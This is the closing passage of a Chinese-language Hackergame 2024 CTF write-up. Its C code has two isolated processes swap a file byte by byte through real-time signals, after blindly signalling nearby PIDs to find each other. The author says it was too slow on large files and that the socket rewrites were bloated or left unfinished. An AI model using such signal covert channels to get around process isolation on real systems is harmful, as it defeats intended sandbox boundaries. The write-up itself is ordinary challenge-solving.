int byte_id = 0;
FILE *f;
int file_len;


void send_byte(int offset) {
    #ifdef IS_ALICE
    while (byte_id < offset ); // wait for sync
    #endif
    #ifdef IS_BOB
    while (byte_id < offset ); // wait for sync
    #endif
    fseek(f, offset, SEEK_SET);
    // send data to receiver
    union sigval value;
    value.sival_int = fgetc(f);
    sigqueue(peer_pid, SIGRTMIN, value);
    #ifdef IS_DEBUG
    printf("sent %d: %d\n", offset, value.sival_int);
    #endif
    // usleep(10);
    #ifdef IS_BOB
    if (offset + 1 == file_len){
        printf("bob done!\n");
        kill(getpid(), SIGKILL);    // bob should exit on last byte sent
    }
    #endif
}
void handler(int signo, siginfo_t *info, void *context) {
    if (signo == SIGUSR2) { // handshake
        fprintf(stderr, "received SIGUSR2 from pid %d\n", info->si_pid);
        peer_pid = info->si_pid;
    }
    if (signo == SIGRTMIN) {    // data

        #ifdef IS_BOB
        send_byte(byte_id);
        #endif

        fseek(f, byte_id, SEEK_SET);
        fputc(info->si_value.sival_int, f);
        #ifdef IS_DEBUG
        printf("received byte %d: %d\n", byte_id, info->si_value.sival_int);
        #endif
        byte_id++;
        #ifdef IS_ALICE
        if (byte_id == file_len){
            printf("alice done!\n");
            kill(getpid(), SIGKILL);    // alice should exit on last byte arrived
        }
        #endif
    }
    return;
}


int main(void) {
    int pid = getpid();
    struct sigaction sa;
    sa.sa_sigaction = handler;
    sa.sa_flags = SA_SIGINFO;
    if (sigaction(SIGUSR2, &sa, NULL) == -1 || sigaction(SIGRTMIN, &sa, NULL) == -1) {
        perror("sigaction");
        exit(-1);
    }

    #ifdef IS_ALICE
    sleep(1);
    #endif

    for (int i = pid - 3; i < pid + 5; i++) {
        if (i == pid) {
            // don't send signal to myself
            continue;
        }
        int _ = kill(i, SIGUSR2);
        if (_) {
            printf("sending sig to %d failed", i);
            perror("kill");
        }
    }
    while (peer_pid == -1);


    // f = fopen("b", "r+");

    #ifdef IS_DEBUG
    #ifdef IS_ALICE
    f = fopen("a", "r+");
    #else
    f = fopen("b", "r+");
    #endif
    #else
    f = fopen("/space/file", "r+");
    #endif

    // get file size
    fseek(f, 0, SEEK_END);
    file_len = ftell(f);
    #ifdef IS_ALICE // alice should send first
    for (int i = 0; i < file_len; i++) {
        send_byte(i);
    }
    #endif
    while(1) sleep(5);
    return 0;
}
```

跑起来之后发现虽然可以成功交换小文件，但是大文件的处理速度实在太慢，就没成功

后来才想起来，哎呀！这不是可以用 `socket` 吗....

重新用 `boost` 写了一个 `socket` 传输的版本，快是很快了，但是编译出来有 14M...

于是重新开新坑，用原版 `socket` 写，写到一半不想写了去玩游戏了。其实可能也可以用 python (我甚至没去看环境里有没有)，想起来的时候已经不想玩了～


## 附录

如需找我聊天，可以去 [我的博客上的该页面](https://leohearts.com/archives/hackergame_2024.html) 评论

  [1]: ./assets//4046521366.webp
  [2]: ./assets//281655009.webp
  [3]: ./assets//4046521366.webp
  [4]: ./assets//1500912061.webp
  [5]: ./assets//3096051582.webp
  [6]: ./assets//557543131.webp
